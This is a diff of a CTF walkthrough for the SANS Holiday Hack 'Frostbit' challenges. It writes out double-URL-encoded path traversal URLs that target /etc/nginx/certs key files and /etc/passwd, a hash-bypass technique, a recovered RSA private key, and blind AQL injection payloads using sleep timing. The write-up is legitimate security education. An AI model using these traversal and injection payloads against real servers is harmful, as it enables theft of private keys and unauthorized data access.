@@ -1,4 +1,9 @@
 # Act 3
+
+[[#Santa Vision]]
+[[#Elf Stack]]
+[[#Decrypt the Naughty-Nice List]]
+[[#Deactivate the Frostbit Naughty-Nice List Publication]]
 ## Santa Vision
 **Location:** The Front Yard (Act 3)
 **NPC:** Ribb Bonbowford
@@ -598,97 +603,290 @@ SERVER_TRAFFIC_SECRET_0 3b1d770422e0614742407fc95c3a3c1151832242c5386fdc693367d0
 
 Let's open up the pcap with wireshark and see what traffic we can inspect.
 
----
+![Wireshark encrypted](../images/frostbit_decrypt/wireshark_encrypted.png)
+It seems as though all the traffic is encrypted with TLS. Let's import those secrets we found in the core dump so that we can read the data. Make a file called `ssl-key.log` and put the keys we just found in it. Now go into `Wireshark -> Preferences -> Protocols -> TLS` and load your `ssl-key.log` file into the "(Pre)-Master-Secret log filename" input. Press OK and go back to the TLS traffic. At the bottom of the frame view you should now have a "Decrypted TLS" tab to view the now decrypted TLS data.
 
-Run strings on core dump, find TLS keys, make .log file to import into wireshark. Can now read encrypted TLS data in wireshark.
-https://blog.didierstevens.com/2020/12/14/decrypting-tls-streams-with-wireshark-part-1/
+![decrypted tls](../images/frostbit_decrypt/decrypted_tls.png)
 
-{"nonce":"7455047a01ea7c1a"}
+Now if you look through all the decrypted TLS traffic, we can find a couple interesting values.
+- `nonce: ec622b7c418bd0c1`
+- `encryptedKey: 6b483e6f04b41a10ea694c53933aacc3b35929bfba7d39c03170d33ef858397263f04535128505e080538812a615b6356a0250e65f061414ae876ecc6de6f6c5a72693efd70ea7f38ff58a2d0c913d94dbe7a98bbf24f1fe0a57be39b3e1b0295160bc27b363c5513dc7326dafb3705b22cb6326550e3498b498dd6bc5215df694af02c4f3e12ae53df9608440374b8255048d3f6bdfd98861dced9f8254598f57414792e8c67788d2b1ffeeadeebedad255a2d910cf13fd8e04853fe096844334fe782ed86ebbc4f4d08a4e417e4b5e99f59c7f9ef0e87579667b13d1fc87015f9ed19faef9cd7d77c4147b8cb3c81e9ea0bcf046c7707ea3f340cff28b38f3eee88332ae81e2afb50a6961290b1a7bb29871bb33c8e851f948ac51c5cc1e9ff5f11da65e45f73e27301b348d410a153bbbb2eb98b5ca89495fff4eedcdd68f1e0dae3dcdffd0ae978d903402ffb0e8f20619217daf76e5dcafd3a9c113c67b17b420b298c478af5cb59b2fff07a427e344f6f3eaaa1cff78c08432d7547871a5201016f8dd2e571bc54d3be9e2281763f75cf3215afbe0516c969fe630a194c419f28ae4e877949175ca9906621488060db24dcf61b7cf4d7a07ac1bb5fd6bb395689bea1773d8193e8a94113959fdc95ee782c1622f391cd8c5de4bbf3efbffa042745af871142059a977133498fa23f1687f2519b70552f9129c845d7bd9`
 
-Found this link in core dump strings
-https://api.frostbit.app/view/CxHT7yuDY/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202829
+These values might come in handy later. For now let's go back to looking through the core dump. The following domain appears a couple times `api.frostbit.app`. Let's visit it and see what's there.
 
-Found some endpoints
+![Home page](../images/frostbit_decrypt/homepage.png)
 
-https://api.frostbit.app/api/v1/bot/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/session (GET)
+This looks like the frostbit ransomware main page. It shows a large timer for how much time we have before the Naughty Nice List is published online.
 
-https://api.frostbit.app/api/v1/bot/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/key (POST)
-{"encryptedkey":"434cf52ed799bf94da53382f00c52101e0b694abf51e1de31c78d193ab3d492050985e9bf53c42f95c68014441a3f9649feefcebf0d6fb8ef7bec3af31cb69ccb2de9bcb2de0d843f0687c20b46c0fd1a42a92d5f99037915124cce81035f2004c0bf74a3c74ae13b2712fef4b3428fb071b8a047234cc04c14a8820c0f975b142616c5bb96644c3e653c8034c6263ff15e6547f906fbd12eae9abd9fa8d47bc411b7bf1f7f08023a869e05015037f67933d6a4b65e37806e0cf1842aa2144b1f18a5b4ddaf82b044c9330fed92fd0620aed432b42de5e88d87068d2a922d71a4fe6a290445af45f7833fa445bfa6d0dcc997b158f0956f62592e10ca153f1bc2d4ed11396349379050411e17310cfca91871cb8f3a81e8f179ee51a7052276752bcda50ce82f6ff0901cc159044b24d1e7944541dd37a09ad143b1c87a144baace24496373fc996b9ca7544212612d488cb039c67514eaa38c07c4570276371362a02bd3a70a8d44ac07da2044c4db29384a3b9e183d506e3eaffbd940e27431e194221bee8c88da35a3ff9174d72c40b6271d7554804726a6a0c20d5119ce463dd32282c36bd924466ac2af6999a0a8751019fb3a75fbcfd72e07ef572a36ac4847336225f5df83fd2958ab904f3de22c6c0e74c3ce9963e928cc3e1172e2be5ac23386f0731d7ec01b5aff49da9b77e7ba10bc5102f955936e61aec639a79","nonce":""}
-
-Found this url with debug set and we get some small extra info at the bottom
-https://api.frostbit.app/view/CxHT7yuDY/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202829&debug=true
-
-Found this error from messing with digest in url
-https://api.frostbit.app/view/CxHT7yuDY/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c01082202829&debug=true
-
-{"debug":true,"error":"Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"}
-
-Found the file at this url
-https://api.frostbit.app/static/FrostBiteHashlib.py
-
-From santa vision we know the file /etc/nginx/certs/api.frostbit.app.key exists
-
-I think if we urlencode the url we can use url paths to get the key file
-https://api.frostbit.app/view/..%2F..%2F..%2F..%2F..%2F..%2Fetc/nginx/certs/api.frostbit.app.key/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202829&debug=true
-
-/../../../../etc/nginx/certs/api.frostbit.app.key
-%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fnginx%2Fcerts%2Fapi%2Efrostbit%2Eapp%2Ekey
-%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey
-
-Filename (nonce x2): 7455047a01ea7c1a7455047a01ea7c1a
-LFI: %2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fnginx%2Fcerts%2Fapi%2Efrostbit%2Eapp%2Ekey
-LFI (double encoded): %252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey
-Digest: 00000000000000000000000000000000
-URL: https://api.frostbit.app/view/7455047a01ea7c1a7455047a01ea7c1a%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true
-
-TEST FILE:
-%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
-%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
-https://api.frostbit.app/view/7455047a01ea7c1a7455047a01ea7c1a%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true
-
-Need to url encode filename byte array
-%2574%2555%2504%257a%2501%25ea%257c%251a%2574%2555%2504%257a%2501%25ea%257c%251a
-
-StatusID:
-7455047a01ea7c1a7455047a01ea7c1a
-%74%55%04%7a%01%ea%7c%1a%74%55%04%7a%01%ea%7c%1a
-%74%55%04%7a%01%ea%7c%1a%74%55%04%7a%01%ea%7c%1a
-%2574%2555%2504%257a%2501%25ea%257c%251a%2574%2555%2504%257a%2501%25ea%257c%251a
-
-LFI:
-%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
+Let's try and play around with this site and see if we can find anything interesting. The URL has a bunch of values that we can edit.
 
 URL:
-https://api.frostbit.app/view/%2574%2555%2504%257a%2501%25ea%257c%251a%2574%2555%2504%257a%2501%25ea%257c%251a%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true
+`https://api.frostbit.app/view/CxHT7yuAZ/ae3ac150-d4c0-8b12-bbd2-36ce7bc39691/status?digest=0000440d0a9e760804015c0108202828`
 
-RSA key -> EncryptedKey
-Cyberchef, RSA PKCS1-V1_5 - input is encryptedkey but it must be binary I think (use cyberchef to convert)
+What happens if I remove a digit from the `digest`? We get an error: `{"error":"Invalid Request"}`. We get the same error if we change the path value after /view or the uuid value before /status. One of the hints for this challenge mentions that there might be a dev mode on this webpage that was not disabled, meaning we could potentially take advantage of it by getting extra information from any errors we encounter. The most obvious option to try would be to simply add a url parameter like `dev=true` or `debug=true`. Sure enough, adding `&debug=true` to the end of our url combined with removing a single character of the path variable after /view/ gives us another error, but this time with more detailed information.
 
-Encryptedkey (128 bit key and 64 bit IV)
-Cyberchef - AES (utf-8 values for key and IV) input open csv.frostbit as raw, output raw. Mode CBC
+```json
+{"debug":true,"error":"Status Id File Not Found"}
+```
 
-### Frostbit Deactivate
+Now if we do the same, but instead remove the character from the digest, we get another detailed error.
+
+```json
+{"debug":true,"error":"Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"}
+```
+
+Let's see if we can grab this file from the webserver by modifying the url.
+
+URL:
+`https://api.frostbit.app/static/FrostBiteHashlib.py`
+
+From this URL, we get the following python file.
+
+```python
+import traceback
+import binascii
+
+class Frostbyte128:
+    def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16):
+        self.file_bytes = file_bytes
+        self.filename_bytes = filename_bytes
+        self.filename_bytes_length = len(self.filename_bytes)
+        self.nonce_bytes = nonce_bytes
+        self.nonce_bytes_length = len(self.nonce_bytes)
+        self.hash_length = hash_length
+        self.hash_result = self._compute_hash()
+
+    def _compute_hash(self) -> bytes:
+        hash_result = bytearray(self.hash_length)
+        count = 0
+
+        for i in range(len(self.file_bytes)):
+            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
+            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
+            count += 1
+
+        for i in range(len(self.filename_bytes)):
+            count_mod = count % self.hash_length
+            count_filename_mod = count % self.filename_bytes_length
+            count_nonce_mod = count % self.nonce_bytes_length
+            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
+            hash_result[count_mod] = hash_result[count_mod] & xrd
+            count += 1
+
+        return bytes(hash_result)
+
+    def digest(self) -> bytes:
+        """Returns the raw binary hash result."""
+        return self.hash_result
+
+    def hexdigest(self) -> str:
+        """Returns the hash result as a hexadecimal string."""
+        return binascii.hexlify(self.hash_result).decode()
+
+    def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None):
+        """Updates the internal state with new bytes and recomputes the hash."""
+        if file_bytes is not None:
+            self.file_bytes = file_bytes
+        if filename_bytes is not None:
+            self.filename_bytes = filename_bytes
+        if nonce_bytes is not None:
+            self.nonce_bytes = nonce_bytes
+
+        self.hash_result = self._compute_hash()
+
+    def validate(self, hex_string: str):
+        """Validates if the provided hex string matches the computed hash."""
+        try:
+            decoded_bytes = binascii.unhexlify(hex_string)
+            if decoded_bytes == self.digest():
+                return True, None
+        except Exception as e:
+            stack_trace = traceback.format_exc()
+            return False, f"{stack_trace}"
+        return False, None
+```
+
+After looking over this file, its clear that it is a custom hashing function. Based on the naming convention of the inputs, it seems as though this function is taking input of a file, and a nonce to produce a digest, which is what we have been seeing in our url parameters and also what we modified to produce the error to get the path to this file.
+
+The error that we produced by modifying the url path value following `/view/` was a "File not found" error. This seems as though the path value that we modified was actually a filename that the server was retrieving. Once we modified the value, the server was unable to find the file and so it produced the error. This means that we have the ability to set the filename that is given to this hashing function. If we can calculate a digest that matches the digest of a file we want to see on the server, we could potentially retrieve it. The only other item we need is the `nonce` which we have from the pcap file!
+
+If you remember back in the Santa Vision challenge, we saw an interesting message in the frostbit feed.
+
+`Let's Encrypt cert for api.frostbit.app verified. at path /etc/nginx/certs/api.frostbit.app.key`
+
+Based on what we know now, this is likely the key that we can use to start the decryption. This will be the file we want to retrieve.
+
+What we need to figure out now, is how can we create a hash for the file we want, that we can calculate beforehand to put in the digest. Since the output of the hash is based on the input of not only the filename, but also the file contents which we don't have access to, it seems impossible. But upon closer inspection of the hashing function, we find a vulnerability which lies in the `_compute_hash` function.
+
+```python
+def _compute_hash(self) -> bytes:
+        hash_result = bytearray(self.hash_length)
+        count = 0
+
+        for i in range(len(self.file_bytes)):
+            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
+            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
+            count += 1
+
+        for i in range(len(self.filename_bytes)):
+            count_mod = count % self.hash_length
+            count_filename_mod = count % self.filename_bytes_length
+            count_nonce_mod = count % self.nonce_bytes_length
+            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
+            hash_result[count_mod] = hash_result[count_mod] & xrd
+            count += 1
+
+        return bytes(hash_result)
+```
+
+The function first loops through the `file_bytes` logically XORing the `file_bytes` with the `nonce_bytes`. It does this for each byte and then saves the result in the `hash_result`. The function then does another loop, this time over the `filename_bytes`, logically XORing `filename_bytes` with `nonce_bytes`. The result of this is then logically ANDed with the hash result bytes from the first loop. The vulnerability is right there. The first loop produces some hash bytes through logical XOR. This is done through the use of the `file_bytes` which we have no influence over. Then the second loop does the same thing with the `filename_bytes` which IS something we can modify. The fact that this happens second is important because since the digest is only 16 bytes long, we just need to overwrite the hash bytes made from the `file_bytes` in the first loop and then we control the whole digest. Since `filename_bytes` is XORed with `nonce_bytes`, if we pass the nonce as the filename, the result of the nonce XORed with the nonce will produce bytes of `0`. Then when this value is ANDed with hash result of the first loop, it will produce all zeros as well. This means that we can produce an all zero digest no matter what the file contents. Then using local file inclusion (LFI) we can try and retrieve the key file we mentioned earlier. Let's start to build a url for this.
+
+The format of the url we want to send will be as follows:
+`https://api.frostbit.app/view/{statusid_filename}/{uuid}/status?digest=00000000000000000000000000000000&debug=true`
+
+Now, since our digest is 16 bytes, we need our filename to also be 16 bytes to cancel it out. The nonce is 8 bytes long so we simply double it.
+
+statusid_filename: `ec622b7c418bd0c1ec622b7c418bd0c1`
+
+Now, to add our LFI, the path we would want is something like this `/../../../../../../etc/nginx/certs/api.frostbit.app.key`.
+
+The problem with that is that if we just append that onto the end of the `statusid` filename we have, nginx and the server will simplify the path by removing all of the directory traversals and ultimately give us a 404 error saying the URL is not found. To get around this, we need to URL encode the data, not just once, but twice so that neither nginx nor the server simplify the path before it gets resolved.
+
+Lets urlencode the statusid_filename first.
+
+Filename: `ec622b7c418bd0c1ec622b7c418bd0c1`
+Single URL Encoded: `%ec%62%2b%7c%41%8b%d0%c1%ec%62%2b%7c%41%8b%d0%c1`
+Double URL Encoded: `%25ec%2562%252b%257c%2541%258b%25d0%25c1%25ec%2562%252b%257c%2541%258b%25d0%25c1`
+
+Now the LFI path.
+
+LFI: `/../../../../../../etc/nginx/certs/api.frostbit.app.key`
+Single URL Encoded: `%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fnginx%2Fcerts%2Fapi%2Efrostbit%2Eapp%2Ekey`
+Double URL Encoded: `%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey`
+
+Now if we put it all together, it should look like this.
+
+`https://api.frostbit.app/view/%25ec%2562%252b%257c%2541%258b%25d0%25c1%25ec%2562%252b%257c%2541%258b%25d0%25c1%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey/ae3ac150-d4c0-8b12-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true`
+
+https://api.frostbit.app/view/%25ec%2562%252b%257c%2541%258b%25d0%25c1%25ec%2562%252b%257c%2541%258b%25d0%25c1%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fnginx%252Fcerts%252Fapi%252Efrostbit%252Eapp%252Ekey/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/status?digest=00000000000000000000000000000000&debug=true
+
+Let's give it a try.
+
+After sending the request, we see the following private key at the bottom of the webpage:
+
+```
+-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----
+```
+
+Now, your first thought might be to try and decrypt the Naughty Nice List right away, but one of the hints we received should make you think of another option. 
+
+Hint: *"Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI"*
+
+Remember the `encryptedKey` value in the TLS traffic? That might be the real decryption key that was encrypted with this RSA key. Let's try and decrypt it using CyberChef. Firstly, we need to convert the encryptedKey hex data to binary. Do this with CyberChef as well with the recipe `From Hex` and the delimiter set to auto.
+
+![Hex to binary](../images/frostbit_decrypt/hex_to_bin.png)
+
+Now copy the binary output and paste it into the input. Switch the CyberChef recipe to `RSA Decrypt`, put the RSA private key in the correct input and set the encryption scheme to `RSAES-PKCS1-V1_5`.
+
+![Decrypted key](../images/frostbit_decrypt/decrypted_key.png)
+
+We have now decrypted the `encryptedKey`:
+
+`9b07dc230a67bb341fb2d6ea401bcad0,7455047a01ea7c1a`
+
+With a bit of research, I determined that this was a symmetric encryption key (likely AES) along with its initialization vector (IV). Let's use CyberChef again to try and decrypt the csv file with this key. Use the AES decrypt recipe, input the key and the iv and set the mode to CBC. CyberChef gives an error about the IV being too short, turns out its because the iv is in utf-8 encoding, not hex. The same turns out to be true for the key, so switch both of those over. Now open the encrypted CSV file with CyberChef's built in file browser and make sure Input and Output are both set to RAW. Once you do that, you should see the decrypted Naughty-Nice List!
+
+![Naughty Nice List](../images/frostbit_decrypt/decrypted_list.png)
+
+If you scroll all the way to the bottom of the file, we can see that the child at row 440 is named `Xena Xtreme`.
+
+Answer: `Xena Xtreme`
+
+Done!
+### Deactivate the Frostbit Naughty-Nice List Publication
 **Location:** The Front Yard (Act 3)
 **NPC:** Tangle Coalbox
 **Note:** This challenge uses the same assets as `Frostbit Decrypt`
 
 *Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.*
 
-Interesting message in frostbitfeed:
+If you remember the Santa Vision challenge, we saw the following message show up in the `frostbitfeed` topic:
+
 `Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley
 
-https://api.frostbit.app/api/v1/frostbitadmin/bot/ae3ac150-d4c0-4c35-bbd2-36ce7bc39691/deactivate
+It seems that Wombley was trying to deactivate the frostbit ransomware at the following endpoint:
+`https://api.frostbit.app/api/v1/frostbitadmin/bot/<botuuid>/deactivate`
 
-Set query param debug=true
+Since this is using the same domain and infrastructure as the previous challenge, let's set the query param `debug=true`. If it's anything like that challenge, we will find some extra error information because of it. 
 
-SQL injection point is in X-API-Key
-give it a ' and this is what it returns
+Let's use postman to make some requests. If we send an http request to that endpoint, we get the following response back:
+
+![Postman](../images/frostbit_deactivate/postman.png)
+
+We need to find the right API-Key so we can deactivate the ransomware. Since the API-Key is a user set value, let's see if it's vulnerable to SQL injection. Send it an http request with just one single quote to see if it produces an error:
+
 ```
 {
-"debug": true,
-"error": "Timeout or error in query:\nFOR doc IN config\n FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n <other_query_lines_omitted>\n RETURN doc"
+	"debug": true,
+	"error": "Timeout or error in query:\nFOR doc IN config\n FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n <other_query_lines_omitted>\n RETURN doc"
 }
 ```
+
+Perfect! It is vulnerable to injection. I do not recognize the syntax returned in the error statement. Let's see if we can figure out what kind of database this is. I gave ChatGPT the full error and asked it what kind of database it thought it was. It responded that it was likely `ArangoDB`. I checked out the ArangoDB website, and sure enough the syntax was a match.
+
+If we look at the error message we were returned, we can see that the database is checking our provided value with a value in the database to see if it matches. Since the name of the value in the database is omitted from the error message, we cannot simply add our own key to the database. We first need to figure out what the name is so we know where to add our own. I turned to the [ArangoDB documentation](https://docs.arangodb.com/stable/) to search for options.
+
+After trying many different options with the ArangoDB syntax, I found that the following strings all produced a `Request Blocked` error when sent in the API key value.
 
 Blocked:
 ```
@@ -708,52 +906,55 @@ with
 STARTS_WITH
 ```
 
-Tried this:
-' {x_api_key:"test"} INTO config
-Didnt work
+Another thing to note, is that the error messages produced do not return any extra data from the query. This means we are using a blind injection point. Even though we can't visually see the exact data we are querying, there are various techniques for blind SQL injection attacks. See the following article for a good list.
 
-`' OR '1'=='1`
-This didnt give a query error but gave an invalid key error.
+https://owasp.org/www-community/attacks/Blind_SQL_Injection
 
-' OR sleep(50)==null OR '1'=='1
-' and 
+One of the most common blind SQL injection methods, is to use a SLEEP query in your statement. If the statement executes correctly, you should see a delay in the response. If not, then there must have been an error. Let's see if we can get something working.
 
-sleep function seems to work, but the query times out at 2s so need to set sleep for max 1.9
-Also need to set third comparison to resolve to true for the sleep to work for some reason:
-`'OR sleep(1.9)==null OR '1'=='2
+The ArangoDB `sleep` function seems to work, but the query will time out at 2 seconds and send back the following error:
 
-I FOUND SOMETHING
-The following works (I put the sleep as the second comparison)
+```
+{
+	"debug": true,
+	"error": "Timeout or error in query:\nFOR doc IN config\n FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n <other_query_lines_omitted>\n RETURN doc"
+}
+```
 
-`'OR HAS(doc, "_id") OR sleep(1.9)==null OR '1'=='2`
+This means we can sleep for a maximum of 1.9s before it times out and gives us that generic error. Also, we need to set the last comparison in our statement to resolve to false for the sleep to work. This is because with an OR statement, if one equivalency check succeeds, then the whole statement succeeds. If we set the last comparison to '1'='1 then it will evaluate to true and skip the sleep statement. But if we set '1'='2 it will evaluate to false and force the sleep statement to complete to check its result in the comparison. 
 
-If you change `_id` to something else, it will sleep for 1.9s but as is, it returns immediately. This means I can start to enumerate what parameters doc has.
+`'OR sleep(1.9)==null OR '1'=='2   --> Delays for 1.9 seconds.
 
-I FOUND SOMETHING ELSE
-I can also do the following queries to figure out how many attributes there are
-`'OR LENGTH(doc)>0 OR sleep(1.9)==null OR '1'=='2` --> DELAY
-`'OR LENGTH(doc)>10 OR sleep(1.9)==null OR '1'=='2` --> DELAY
-`'OR LENGTH(doc)>4 OR sleep(1.9)==null OR '1'=='2` --> DELAY
-`'OR LENGTH(doc)==4 OR sleep(1.9)==null OR '1'=='2` --> NO DELAY
+This also means that we can add in a comparison check that we want to know with an OR, and if there is a delay of 1.9 seconds, it means that it evaluated to false. But if the query executes with no delay it means that the comparison resolved to true. Lets see how we can make use of that.
 
-So basically we found that there are 4 attributes in each doc. They should be the following:
